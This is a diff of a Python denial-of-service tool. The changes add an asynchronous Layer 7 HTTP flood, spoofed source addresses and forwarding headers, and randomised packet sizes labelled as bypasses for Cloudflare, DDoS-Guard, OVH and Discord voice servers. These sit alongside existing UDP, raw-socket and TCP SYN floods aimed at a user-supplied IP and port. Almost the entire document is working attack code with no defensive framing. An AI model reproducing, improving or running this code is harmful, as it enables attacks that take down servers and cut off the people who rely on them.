@@ -1,4 +1,4 @@
-import socket, threading, random, os, colorama, cloudscraper, requests, time, base64
+import socket, threading, random, os, colorama, requests, time, base64, asyncio, aiohttp
 from scapy.all import *
 from colorama import Fore
 
@@ -32,33 +32,34 @@ YMMMUP^
 """
 print(Fore.LIGHTMAGENTA_EX + logo)
 try:
-    category = input(f"\033[1;37mSelect Attack Category (1: Normal DDoS, 2: Discord Voice Bypass): ")
+    category = input(f"\033[1;37mSelect Attack Category (1: Normal DDoS, 2: Discord Voice Bypass, 3: Layer 7 DDoS): ")
     ip = input(f"\033[1;37mIP Target : ")
     port = int(input("Port : "))
-    bytes = int(input("Bytes Per Sec : "))
+    total_requests = int(input("Total Requests (e.g., 1000000 for 1M): "))
     thrs = int(input("Thread : "))
+    concurrency = int(input("Concurrency Level (e.g., 1000 for high RPS): "))
     bost = input("Use Boost ? Y/N : ")
     if os.name == "posix":
         os.system('clear')
     elif os.name == "nt":
         os.system('cls')
     if bost.lower() == 'y':
-        bytes = bytes + 500
+        total_requests = total_requests + 500000  # Boost adds 500k requests
     print(Fore.LIGHTMAGENTA_EX + logo)
     print(Fore.LIGHTRED_EX+"Attacking...")
     print(Fore.LIGHTWHITE_EX+"ATTACK STATUS: ")
     print("╔═════════════════")
     print(f"║ IP    : {ip}   ")
     print(f"║ Port  : {port} ")
-    print(f"║ BPS   : {bytes}")
+    print(f"║ Reqs  : {total_requests}")
     print(f"║ Thrds : {thrs} ")
+    print(f"║ Conc  : {concurrency} ")
     print(f"║ Boost : {bost} ")
-    print(f"║ Bot   : {bytes} ")
-    print(f"║ Mode  : {'Normal DDoS' if category == '1' else 'Discord Voice Bypass'} ")
+    print(f"║ Mode  : {'Normal DDoS' if category == '1' else 'Discord Voice Bypass' if category == '2' else 'Layer 7 DDoS'} ")
     print("╚═════════════════")
 
     def webrtc_bypass(ip, port, fk, ua_choice):
-        """Simulate WebRTC traffic to bypass Cloudflare for Discord voice servers."""
+        """Simulate WebRTC traffic to bypass Cloudflare and DDoS-Guard for Discord voice servers."""
         webrtc_headers = (
             f"GET / HTTP/1.1\r\n"
             f"Host: {fk}\r\n"
@@ -69,6 +70,7 @@ try:
             f"Sec-WebSocket-Version: 13\r\n"
             f"Upgrade: websocket\r\n"
             f"X-Discord-Client: discord-webrtc\r\n"
+            f"X-Forwarded-For: {random.choice(fake)}\r\n"
             f"\r\n"
         ).encode('utf-8')
         try:
@@ -78,45 +80,86 @@ try:
         except:
             pass
 
+    async def async_http_flood(session, url, headers, payload):
+        try:
+            async with session.get(url, headers=headers) as response:
+                await response.text()
+            async with session.post(url, headers=headers, data=payload) as response:
+                await response.text()
+        except:
+            pass
+
+    async def layer7_attack(ip, port, fk, ua_choice, concurrency, total_requests):
+        """Optimized async Layer 7 HTTP flood for high RPS."""
+        url = f"http://{ip}:{port}/"
+        headers = {
+            "Host": fk,
+            "User-Agent": ua_choice,
+            "Accept": "*/*",
+            "Connection": "keep-alive",
+            "X-Forwarded-For": random.choice(fake),
+            "CF-Connecting-IP": random.choice(fake),
+            "Via": f"2.0 {fk}",
+            "X-Requested-With": "XMLHttpRequest"
+        }
+        payloads = [
+            f"rand={random.randint(1, 1000000)}&ts={int(time.time())}",
+            f"q={os.urandom(16).hex()}",
+            f"action=submit&value={os.urandom(32).hex()}"
+        ]
+        semaphore = asyncio.Semaphore(concurrency)
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=thrs)) as session:
+            tasks = []
+            for _ in range(total_requests // 2):  # Split between GET and POST
+                async def bound_flood():
+                    async with semaphore:
+                        await async_http_flood(session, url, headers, random.choice(payloads))
+                tasks.append(bound_flood())
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    def run_async_layer7(ip, port, fk, ua_choice, concurrency, total_requests):
+        asyncio.run(layer7_attack(ip, port, fk, ua_choice, concurrency, total_requests))
+
     def c2():
         for fk in fake:
+            ua_choice = random.choice(ua)
             try:
-                # UDP Flood
-                s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                byte = random._urandom(60000)
-                sent = 5000
-                s1.sendto(byte, (ip,port))
-                for i in range(bytes):
-                    s1.sendto(byte, (ip,port))
-                    s1.sendto(byte, (ip,port))
+                if category == '3':
+                    # Optimized Layer 7 DDoS with async for high RPS
+                    run_async_layer7(ip, port, fk, ua_choice, concurrency, total_requests)
+                else:
+                    # UDP Flood with OVH bypass
+                    s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    byte = random._urandom(random.randint(1000, 60000))  # Fragmented packets for OVH
+                    sent = 5000
+                    s1.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                    s1.sendto(byte, (ip, port))
+                    for i in range(total_requests):
+                        s1.sendto(byte, (ip, port))
+                        s1.sendto(byte, (ip, port))
+                        if category == '2':
+                            time.sleep(random.uniform(0.01, 0.1))  # Random delay for Discord
+                    # HTTP Flood with Cloudflare bypass
+                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s2.connect((ip, port))
+                    s2.send((f"GET {ip} HTTP/1.1\r\nHost: {fk}\r\nX-Forwarded-For: {random.choice(fake)}\r\nCF-Connecting-IP: {random.choice(fake)}\r\n").encode("utf-8"))
+                    s2.send(("User-Agent: "+ua_choice+"\r\n").encode("utf-8"))
+                    s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n").encode("utf-8"))
+                    s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"))
+                    s2.send(byte)
+                    # TLS Flood
+                    s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
+                    s3.connect((ip, port))
+                    s3.send((byte))
+                    # TCP SYN Flood with OVH bypass
+                    fuck = IP(dst=ip, src=random.choice(fake))  # Spoofed source IP
+                    tcp = TCP(sport=RandShort(), dport=port, flags="S")
+                    raw = Raw(b"X"*random.randint(1000, 60000))  # Fragmented packets
+                    p = fuck / tcp / raw
+                    send(p, loop=total_requests, verbose=0)
+                    # Discord Bypass
                     if category == '2':
-                        time.sleep(random.uniform(0.01, 0.1))  # Random delay for Discord bypass
-                # HTTP Flood
-                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s2.connect((ip,port))
-                s2.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n").encode("utf-8"))
-                s2.send(("User-Agent: "+random.choice(ua)+"\r\n").encode("utf-8"))
-                s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n").encode("utf-8"))
-                s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"))
-                s2.send(byte)
-                # TLS Flood
-                s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
-                s3.connect((ip,port))
-                s3.send((byte))
-                # TCP SYN Flood
-                fuck = IP(dst=ip)
-                tcp = TCP(sport=RandShort(), dport=port, flags="S")
-                raw = Raw(b"X"*60000)
-                p = fuck / tcp / raw
-                send(p, loop=bytes, verbose=0)
-                # Cloudscraper Request
-                scraper = cloudscraper.create_scraper()
-                scraper.get(ip, timeout=thrs)
-                # Discord Bypass
-                if category == '2':
-                    webrtc_bypass(ip, port, fk, random.choice(ua))
-                    scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
-                    scraper.get(ip, timeout=thrs, headers={'Host': fk, 'User-Agent': random.choice(ua)})
+                        webrtc_bypass(ip, port, fk, ua_choice)
             except socket.gaierror:
                 print(Fore.LIGHTRED_EX+"[!] Fail get target info, did you type the target correct? [!]")
                 exit()
@@ -125,31 +168,31 @@ try:
                 print(Fore.LIGHTRED_EX+"TARGET IS DOWN ! ")
             except:
                 print(Fore.LIGHTMAGENTA_EX+"[ C2 ] INFO : SUCCESSFULLY FLOODING TARGET <3 [ C2 ]")
-                # Repeat original attack logic for consistency
-                s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                byte = random._urandom(60000)
-                sent = 5000
-                s1.sendto(byte, (ip,port))
-                for i in range(bytes):
-                    s1.sendto(byte, (ip,port))
-                    s1.sendto(byte, (ip,port))
-                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s2.connect((ip,port))
-                s2.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n").encode("utf-8"))
-                s2.send(("User-Agent: "+random.choice(ua)+"\r\n").encode("utf-8"))
-                s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n").encode("utf-8"))
-                s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"))
-                s2.send(byte)
-                s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
-                s3.connect((ip,port))
-                s3.send((byte))
-                fuck = IP(dst=ip)
-                tcp = TCP(sport=RandShort(), dport=port, flags="S")
-                raw = Raw(b"X"*60000)
-                p = fuck / tcp / raw
-                send(p, loop=bytes, verbose=0)
-                scraper = cloudscraper.create_scraper()
-                scraper.get(ip, timeout=thrs)
+                if category != '3':
+                    # Repeat original attack logic for consistency
+                    s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    byte = random._urandom(random.randint(1000, 60000))
+                    sent = 5000
+                    s1.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                    s1.sendto(byte, (ip, port))
+                    for i in range(total_requests):
+                        s1.sendto(byte, (ip, port))
+                        s1.sendto(byte, (ip, port))
+                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s2.connect((ip, port))
+                    s2.send((f"GET {ip} HTTP/1.1\r\nHost: {fk}\r\nX-Forwarded-For: {random.choice(fake)}\r\nCF-Connecting-IP: {random.choice(fake)}\r\n").encode("utf-8"))
+                    s2.send(("User-Agent: "+ua_choice+"\r\n").encode("utf-8"))
+                    s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n").encode("utf-8"))
+                    s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"))
+                    s2.send(byte)
+                    s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
+                    s3.connect((ip, port))
+                    s3.send((byte))
+                    fuck = IP(dst=ip, src=random.choice(fake))
+                    tcp = TCP(sport=RandShort(), dport=port, flags="S")
+                    raw = Raw(b"X"*random.randint(1000, 60000))
+                    p = fuck / tcp / raw
+                    send(p, loop=total_requests, verbose=0)
     for i in range(thrs):
         threads = threading.Thread(target=c2)
         threads.start()
